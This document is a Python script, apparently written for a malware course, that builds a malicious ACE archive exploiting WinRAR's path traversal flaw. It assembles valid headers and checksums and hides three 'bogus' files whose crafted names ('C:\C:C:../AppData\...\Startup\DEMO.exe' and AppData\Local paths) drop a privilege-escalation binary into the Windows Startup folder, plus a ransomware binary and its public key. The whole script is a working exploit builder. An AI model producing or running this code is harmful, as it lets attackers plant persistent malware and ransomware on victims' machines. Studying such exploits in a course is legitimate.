
# Script written in Python3 for Malware class
import argparse
from zlib import crc32
import binascii
import pathlib
import os
import acefile
import time
from art import *


WELCOME_SENTENCE = 'WinRAR PoC'
RENE_NAME = 'DEMO.exe'
RENE_NAME2 = 'main.exe'
RENE_NAME3 = 'public.pem'

PREFIX_WINDOWS = f"C:\\C:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
PREFIX2_WINDOWS = f"C:\\C:C:../AppData\\Local\\"



date_now = bytearray([0x0, 0x0, 0x0, 0x0])


def generateAceCrc(data):
    # data is a list of bytes
    initial_value = 0
    initial_value = crc32(data, initial_value)
    return initial_value ^ 0xFFFFFFFF


def byte(number, i):
    return (number & (0xff << (i * 8))) >> (i * 8)

def builder_header(path):
    with open(path, 'wb') as f:

        headers_buffer = bytearray()
        header_crc = bytearray([0x00, 0x00])
        header_size = bytearray([0x31, 0x00])
        hdr_type = bytearray([0x00])
        hdr_flags = bytearray([0x00, 0x90])
        magic = bytearray('**ACE**'.encode())
        eversion = bytearray([0x14])
        cversion = bytearray([0x14])
        host = bytearray([0x02])
        volume = bytearray([0x00])
        datetime = bytearray([0x10, 0x18, 0x56, 0x4E])
        #datetime = date_now
        reserved1 = bytearray([0x97, 0x4F, 0xF6, 0xAA, 0x00, 0x00, 0x00, 0x00])
        advert_size = bytearray([0x16])
        advert = bytearray('*UNREGISTERED VERSION*'.encode())

        headers_buffer += header_crc
        headers_buffer += header_size
        headers_buffer += hdr_type
        headers_buffer += hdr_flags
        headers_buffer += magic
        headers_buffer += eversion
        headers_buffer += cversion
        headers_buffer += host
        headers_buffer += volume
        headers_buffer += datetime
        headers_buffer += reserved1
        headers_buffer += advert_size
        headers_buffer += advert

        crc = generateAceCrc(headers_buffer[4:])
        headers_buffer[0], headers_buffer[1] = byte(crc, 0), byte(crc, 1)

        # Try to write to disk
        f.write(headers_buffer)


def build_example_file(ex_file, dest_path, bogus=False, bogus2=False, bogus3=False):
    p = pathlib.Path(ex_file)
    file_read = p.read_bytes()

    file_crc32 = generateAceCrc(file_read)

    file_buffer = bytearray()
    headers_crc = bytearray([0x00, 0x00])
    #header_size = 31 + pathlib.Path('../files/f1.txt').parent.absolute()

    if (not bogus and not bogus2 and not bogus3) :
        file_path_len = (31 + len(str(pathlib.Path(p).name))).to_bytes(2, byteorder='little')
    elif bogus :
        file_path_len = (31 + len(f"{PREFIX_WINDOWS}{RENE_NAME}")).to_bytes(2, byteorder='little')
    elif bogus2 :
        file_path_len = (31 + len(f"{PREFIX2_WINDOWS}{RENE_NAME2}")).to_bytes(2, byteorder='little')
    elif bogus3 :
        file_path_len = (31 + len(f"{PREFIX2_WINDOWS}{RENE_NAME3}")).to_bytes(2, byteorder='little')

    header_type = bytearray([0x1])
    header_flags = bytearray([0x01, 0x80])

    file_size = os.path.getsize(p).to_bytes(4, byteorder='little')
    orig_size = os.path.getsize(p).to_bytes(4, byteorder='little')
    ftime = bytearray([0x63, 0xB0, 0x55, 0x4E])
    file_attributes = bytearray([0x20, 0x00, 0x00, 0x00])
    crc32_compressed_file = file_crc32.to_bytes(4, byteorder='little')
    compress_type = bytearray([0x00])
    compress_quality = bytearray([0x03])
    param_decomp = bytearray([0x0A, 0x00])
    reserved_1 = bytearray([0x54, 0x45])

    if not bogus and not bogus2 and not bogus3:
        f_name = bytearray(str(pathlib.Path(p).name).encode())
    elif bogus:
        f_name = bytearray(f"{PREFIX_WINDOWS}{RENE_NAME}".encode())
    elif bogus2 :
        f_name = bytearray(f"{PREFIX2_WINDOWS}{RENE_NAME2}".encode())
    elif bogus3 :
        f_name = bytearray(f"{PREFIX2_WINDOWS}{RENE_NAME3}".encode())

    f_name_size = len(f_name).to_bytes(2, byteorder='little')

    file_buffer += headers_crc
    file_buffer += file_path_len
    file_buffer += header_type
    file_buffer += header_flags
    file_buffer += file_size
    file_buffer += orig_size
    file_buffer += ftime
    file_buffer += file_attributes
    file_buffer += crc32_compressed_file
    file_buffer += compress_type
    file_buffer += compress_quality
    file_buffer += param_decomp
    file_buffer += reserved_1
    file_buffer += f_name_size
    file_buffer += f_name

    crc = generateAceCrc(file_buffer[4:])
    file_buffer[0], file_buffer[1] = byte(crc, 0), byte(crc, 1)

    file_buffer += file_read

    with open(dest_path, 'ab') as f:
        f.write(file_buffer)



def parser():
    # We need a list of valid files and the bogus one. Usage: Script --legal f1 f2 f3 f4 f5 --bogus f6
    parser = argparse.ArgumentParser(description="Script to create a malicious file for Cybersecurity - Malware course")

    parser.add_argument("--files", nargs='+', help="Specify normal files", required=True)
    parser.add_argument("--bogus", help="Specify the bogus binary", required=True) # EoP
    parser.add_argument("--bogus2", help="Specify the second bogus binary", required=True) # Ransom
    parser.add_argument("--bogus3", help="Specify the third bogus binary", required=True) # Ransoms PubKey
    parser.add_argument("--output", help="Output of nefarious compressed file", required=True)
    args = parser.parse_args()

    bogus_file_path = args.bogus
    bogus2_file_path = args.bogus2
    bogus3_file_path = args.bogus3
    nefarious_ace_path = args.output
    files_paths = args.files


    print(text2art(WELCOME_SENTENCE))
    print("Selected files: ", end='')
    print(files_paths)
    print("Selected bogus file: ", end='')
    print(bogus_file_path)
    print("Selected second bogus file: ", end='')
    print(bogus2_file_path)
    print("Selected third bogus file: ", end='')
    print(bogus3_file_path)
    print("Selected output for ACE file: ", end='')
    print(nefarious_ace_path)
    print()

    builder_header(nefarious_ace_path)

    n_total_steps = len(files_paths) + 2
    print(f"[1/{n_total_steps}] Successfully created headers")
    n_act_steps = 2
    for file in files_paths:
        print(f"[{n_act_steps}/{n_total_steps}] Adding {file} to ACE file")
        build_example_file(file, nefarious_ace_path)
        n_act_steps += 1

    print(f"[{n_act_steps}/{n_total_steps}] Adding bogus {file} to ACE file")
    build_example_file(bogus_file_path, nefarious_ace_path, bogus=True)

    print(f"[{n_act_steps}/{n_total_steps}] Adding second bogus {file} to ACE file")
    build_example_file(bogus2_file_path, nefarious_ace_path, bogus2=True)

    print(f"[{n_act_steps}/{n_total_steps}] Adding third bogus {file} to ACE file")
    build_example_file(bogus3_file_path, nefarious_ace_path, bogus3=True)

    print("[FINAL] Checking file's integrity by using AceFile library")

    with acefile.open(nefarious_ace_path) as f:
        for member in f:
            if f.test(member):
                print("CRC OK:     %s" % member.filename)
            else:
                print("CRC FAIL:   %s" % member.filename)


if __name__ == '__main__':
    parser()
